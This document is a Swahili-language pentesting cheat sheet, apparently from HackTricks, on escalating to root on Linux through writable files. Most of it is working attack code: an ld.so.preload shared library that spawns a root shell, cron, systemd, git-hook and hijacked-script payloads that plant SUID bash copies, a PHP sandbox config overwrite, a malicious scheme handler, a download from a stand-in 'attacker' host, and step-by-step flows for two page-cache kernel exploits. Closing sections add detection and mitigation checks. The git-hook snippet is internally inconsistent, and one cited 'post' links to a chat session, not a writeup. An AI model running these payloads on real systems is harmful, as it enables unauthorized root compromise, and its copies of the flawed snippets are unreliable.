# Kuandika Faili Yoyote kwa Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Faili hii hufanya kazi kama variable ya mazingira ya **`LD_PRELOAD`**, lakini pia hufanya kazi katika **SUID binaries**.\
Ikiwa unaweza kuiunda au kuibadilisha, unaweza tu kuongeza **path ya library itakayopakiwa** pamoja na kila binary inayotekelezwa.

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** ambazo **huendeshwa** wakati wa **matukio** mbalimbali katika repository ya git, kama vile commit inapotengenezwa, merge... Kwa hivyo, ikiwa **script au user mwenye privileged** anafanya vitendo hivi mara kwa mara na inawezekana **kuandika kwenye folder ya `.git`**, hii inaweza kutumiwa kufanya **privesc**.

Kwa mfano, inawezekana **kutengeneza script** kwenye git repo ndani ya **`.git/hooks`** ili iwe inatekelezwa kila mara commit mpya inapotengenezwa:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Faili za Cron na Muda

Ikiwa unaweza **kuandika faili zinazohusiana na cron ambazo root huzitekeleza**, kwa kawaida unaweza kupata code execution kazi hiyo itakapoendeshwa tena. Malengo ya kuvutia ni pamoja na:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab ya root yenyewe katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- `systemd` timers na services zinazoanzishwa nazo

Ukaguzi wa haraka:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Ongeza cron job mpya ya root** kwenye `/etc/crontab` au faili ndani ya `/etc/cron.d/`
- **Badilisha script** ambayo tayari inaendeshwa na `run-parts`
- **Weka backdoor kwenye timer target iliyopo** kwa kurekebisha script au binary inayoianzisha

Mfano wa payload ndogo ya cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili inayoweza kutekelezwa humo badala yake:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` kwa kawaida hupuuza majina ya faili yenye nukta, kwa hivyo pendelea majina kama `backup` badala ya `backup.sh`.
- Baadhi ya distros hutumia `anacron` au timers za `systemd` badala ya cron ya kawaida, lakini wazo la abuse ni lilelile: **modify kile ambacho root ataexecute baadaye**.

### Faili za Service & Socket

Ikiwa unaweza kuandika **`systemd` unit files** au faili zinazorejelewa nazo, unaweza kupata code execution kama root kwa kureload na kurestart unit hiyo, au kwa kusubiri service/socket activation path i-trigger.

Targets zinazovutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides katika `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries zinazorejelewa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- `EnvironmentFile=` paths zinazoweza kuandikwa na zinazopakiwa na root service

Ukaguzi wa haraka:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Njia za kawaida za abuse:

- **Overwrite `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza kurekebisha
- **Add a drop-in override** yenye `ExecStart=` hasidi na uondoe ya zamani kwanza
- **Backdoor script/binary** ambayo tayari imerejelewa na unit
- **Hijack a socket-activated service** kwa kurekebisha faili husika ya `.service` inayoanza socket inapopokea connection

Mfano wa override hasidi:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Mtiririko wa kawaida wa uanzishaji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ikiwa huwezi kuanzisha upya services mwenyewe lakini unaweza kuhariri unit iliyoamilishwa na socket, huenda ukahitaji tu **kusubiri muunganisho wa client** ili kuchochea utekelezaji wa service yenye backdoor kama root.

### Overwrite `php.ini` yenye vizuizi inayotumiwa na PHP sandbox yenye privileges

Baadhi ya daemons maalum huthibitisha PHP inayotolewa na mtumiaji kwa kuendesha `php` ikiwa na **`php.ini` yenye vizuizi** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code iliyo kwenye sandbox bado ina **uwezo wowote wa kuandika** (kama `file_put_contents`) na unaweza kufikia **njia kamili ya `php.ini`** inayotumiwa na daemon, unaweza **kuandika upya config hiyo** ili kuondoa vizuizi, kisha uwasilishe payload ya pili inayotekelezwa kwa privileges zilizoinuliwa.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida:

1. Payload ya kwanza inaandika upya sandbox config.
2. Payload ya pili inatekeleza code sasa kwa kuwa functions hatari zimewezeshwa tena.

Mfano mdogo (badilisha path kwa ile inayotumiwa na daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), utekelezaji wa pili unapata root context. Hii kimsingi ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika files.

### binfmt_misc

File iliyopo katika `/proc/sys/fs/binfmt_misc` inaonyesha ni binary ipi inapaswa kutekeleza aina zipi za files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

Mshambuliaji aliye na write permissions kwenye victim's configuration directories anaweza kwa urahisi kubadilisha au kuunda files zinazobadilisha system behavior, na kusababisha code execution isiyokusudiwa. Kwa kubadilisha file ya `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwenye file hasidi (kwa mfano, kuweka `x-scheme-handler/http=evil.desktop`), mshambuliaji anahakikisha kwamba **kubofya link yoyote ya http au https kunatekeleza code iliyoainishwa katika file hiyo ya `evil.desktop`**. Kwa mfano, baada ya kuweka code hasidi ifuatayo katika `evil.desktop` iliyopo `$HOME/.local/share/applications`, kubofya URL yoyote ya nje kunaendesha command iliyopachikwa:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Kwa maelezo zaidi, angalia [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) ambapo ilitumika ku-exploit vulnerability halisi.

### Root kutekeleza scripts/binaries zinazoandikika na mtumiaji

Ikiwa privileged workflow inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote ndani ya directory inayomilikiwa na user asiye na privileged), unaweza kuiteka:<sup>[[1]](#references)</sup>

- **Detect the execution:** monitor processes kwa [pspy](https://github.com/DominicBreuker/pspy) ili kubaini root iki-invoke paths zinazodhibitiwa na user:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Thibitisha uwezo wa kuandika:** hakikisha faili lengwa na directory yake zinamilikiwa na user wako au zinaweza kuandikiwa na user wako.
- **Hijack target:** hifadhi backup ya binary/script asili na weka payload inayounda SUID shell (au root action nyingine), kisha rejesha permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (kwa mfano, kubofya kitufe cha UI kinachozindua helper). Root inapotekeleza tena path iliyo-hijackiwa, pata shell iliyoinuliwa kwa `./rootshell -p`.

### Marekebisho ya privileged binaries kwenye page cache pekee

Baadhi ya kernel bugs hazirekebishi file **kwenye disk**. Badala yake, hukuruhusu kurekebisha tu **nakala ya page cache** ya file inayoweza kusomeka. Ikiwa unaweza kulenga binary yenye **setuid** au inayotekelezwa na **root** kwa njia nyingine, execution inayofuata inaweza kuendesha bytes zinazodhibitiwa na attacker kutoka kwenye memory na kuongeza privileges, ingawa file hash iliyo kwenye disk haijabadilika.

Ni muhimu kufikiria hili kama **runtime-only file write primitive**:

- **Disk hubaki safi**: inode na bytes zilizo kwenye disk hazibadiliki
- **Memory huwa dirty**: processes zinazosoma au kutekeleza page iliyo kwenye cache hupata content iliyorekebishwa na attacker
- **Athari ni ya muda**: mabadiliko hutoweka baada ya reboot au cache eviction

Primitive hii iko kati ya **arbitrary file write** ya kawaida na bugs za zamani za **page-cache abuse** kama Dirty COW / Dirty Pipe:

- Dirty COW ilitegemea race
- Dirty Pipe ilikuwa na vikwazo vya write-position
- Primitive ya page-cache-only inaweza kuwa ya kuaminika zaidi ikiwa vulnerable path inatoa direct writes kwenye cached file-backed pages

#### Generic privesc flow

1. Pata kernel primitive inayoweza kuandika kwenye **file-backed page cache pages**
2. Itumie dhidi ya **readable privileged binary** au file nyingine inayotekelezwa na root
3. Trigger execution **kabla** page haijaondolewa kwenye cache
4. Pata code execution kama root huku file iliyo kwenye disk ikiendelea kuonekana haijarekebishwa

Typical high-value targets:

- Binaries za **setuid-root**
- Helpers zinazozinduliwa na **root services**
- Binaries zinazotekelezwa mara kwa mara kutoka kwenye **containers zinazoshiriki host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) ni mfano mzuri wa class hii. Vulnerable path ilikuwa kwenye Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` inaweza kuhamisha references za page-cache pages kutoka kwenye file inayoweza kusomeka kwenda kwenye crypto TX scatterlist
- in-place `algif_aead` decrypt path ilitumia tena source na destination buffers
- `authencesn` kisha iliandika kwenye destination tag region
- region hiyo ilipokuwa bado inarejelea spliced file-backed pages, write iliingia kwenye **page cache ya target file**

Kwa hiyo technique ya kuvutia si CVE yenyewe, bali pattern hii:

- **feed file-backed cache pages kwenye kernel subsystem**
- ifanye subsystem **izichukulie kama writable output**
- trigger overwrite ndogo inayodhibitiwa kwenye memory

Public PoC ilitumia **4-byte writes** zinazorudiwa ku-patch `/usr/bin/su` kwenye memory na kisha kui-execute.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) inaonyesha variant nyingine ya pattern hiyo hiyo ya **page-cache-only write-to-root**, lakini wakati huu sink ni **IPsec ESP decrypt** badala ya `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Technique muhimu ni hatua ya **metadata-laundering**:

- `splice()` huweka **read-only file-backed page-cache page** ndani ya ESP-in-UDP packet
- mitigation ya awali ya DirtyFrag ili-tag skb hiyo kwa `SKBFL_SHARED_FRAG` ili `esp_input()` ifanye **copy kabla ya decrypting**
- netfilter `TEE` hu-duplicate packet kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone huhifadhi **physical page-cache reference ile ile** lakini hupoteza `SKBFL_SHARED_FRAG`
- `esp_input()` kisha huichukulia clone kuwa salama na huendesha **in-place `cbc(aes)` decrypt** juu ya file-backed page

Kwa hiyo somo kwa reviewer ni pana zaidi ya CVE: ikiwa mitigation inategemea **skb/page metadata** kuamua kama operation lazima ifanye copy kwanza, **clone/copy path** yoyote inayohifadhi backing page lakini kuondoa metadata inaweza kufungua tena write primitive bila kutambuliwa.

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya private network namespace**
2. washa loopback na usakinishe **netfilter `TEE` rule** kwenye `mangle/OUTPUT`
3. sakinisha **XFRM ESP transport SAs** kupitia `NETLINK_XFRM`
4. encode kila target 4-byte word kwenye SA `seq_hi` field (DirtyFrag's word-selection trick)
5. tuma spliced ESP-in-UDP packet ili **TEE clone** ifike `esp_input()` na ifanye decrypt **in place**
6. rudia hadi nakala ya page-cache ya `/usr/bin/su` au executable nyingine privileged iwe na code inayodhibitiwa na attacker

Kwa upande wa uendeshaji, impact ni sawa na mfano wa `AF_ALG`: file iliyo kwenye disk hubaki safi, lakini `execve()` hutumia **mutated page-cache bytes** na kutoa root.

Useful exposure checks kwa variant hii:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kupunguza attack-surface kwa muda mfupi pia ni mahususi kwa path hapa: kufanya upgrade hadi kernel yenye `48f6a5356a33` hurekebisha clone path, huku kuzuia autoload ya `xt_TEE` kukiondoa **flag-laundering step**, na kuzuia `esp4` / `esp6` kukiondoa **decrypt sink**.

#### Exposure na hunting

Ikiwa unashuku aina hii ya bug, usitegemee ukaguzi wa disk integrity pekee. Pia thibitisha:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kupakuliwa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface imejengwa ndani ya kernel
- setuid binaries ni targets nzuri kwa sababu patch ya page-cache-only inaweza kutosha kubadilisha foothold ya ndani kuwa root

#### Attack-surface reduction kwa njia ya `algif_aead`

Ikiwa interface iliyo hatarini inatolewa na module inayoweza kupakiwa:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ikiwa ime-compile ndani ya kernel, baadhi ya disclosures zimeripotiwa kuzuia init path kwa:
```bash
initcall_blacklist=algif_aead_init
```
Aina hii ya mitigation inafaa kukumbukwa pia kwa kernel LPE nyingine: ikiwa exploitation inategemea interface maalum ya hiari, kuzima au ku-blacklist interface hiyo kunaweza kuvunja njia ya exploit hata kabla full kernel upgrade haijapatikana.

## Marejeo

- [1] [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
